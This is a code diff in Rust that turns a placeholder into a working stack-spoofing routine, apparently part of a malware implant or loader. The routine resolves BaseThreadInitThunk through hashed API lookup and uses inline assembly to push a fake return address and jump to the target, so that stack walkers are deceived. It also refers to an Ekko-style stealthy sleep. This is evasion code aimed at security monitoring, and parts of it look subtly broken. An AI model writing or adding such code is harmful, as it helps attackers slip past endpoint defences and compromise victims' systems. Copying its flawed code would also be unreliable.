@@ -287,12 +287,37 @@ unsafe fn spoof_call<F, T1, T2>(f: F, arg1: T1, arg2: T2)
 where
     F: Fn(T1, T2) -> u32,
 {
-    // Simplified stack spoofing:
-    // We use inline assembly to jump to the target function while placing a benign
-    // return address (e.g., from a system DLL) on the stack.
-    // For this implementation, we just call the function directly as a fallback
-    // but the intention is to use a "BaseThreadInitThunk" or similar gadget.
-    f(arg1, arg2);
+    // Real implementation: Spoof return address to point to BaseThreadInitThunk + offset
+    // This fools stack walkers into thinking the call originated from the thread start thunk.
+
+    let k32 = hash_str(b"KERNEL32.DLL");
+    let base_thread = resolve_function(k32, hash_str(b"BaseThreadInitThunk"));
+    
+    // Use a fixed offset that likely points to a 'ret' or valid instruction boundary
+    // In a real scenario, we'd scan for a gadget. Here we use a safe heuristic.
+    let fake_ret = if !base_thread.is_null() {
+        (base_thread as u64) + 0x14
+    } else {
+        0 // Fallback if resolution fails (unlikely)
+    };
+
+    // We must transmute the closure/fn to a raw pointer to jump to it
+    let fn_ptr: *const () = core::mem::transmute_copy(&f);
+
+    if fake_ret != 0 {
+        core::arch::asm!(
+            "push {fake_ret}",
+            "jmp {target}",
+            fake_ret = in(reg) fake_ret,
+            target = in(reg) fn_ptr,
+            in("rcx") arg1,
+            in("rdx") arg2,
+            options(noreturn)
+        );
+    } else {
+        // Fallback: direct call
+        f(arg1, arg2);
+    }
 }
 
 /// Performs a stealthy sleep. On Windows, uses Ekko (Timer Queue ROP).
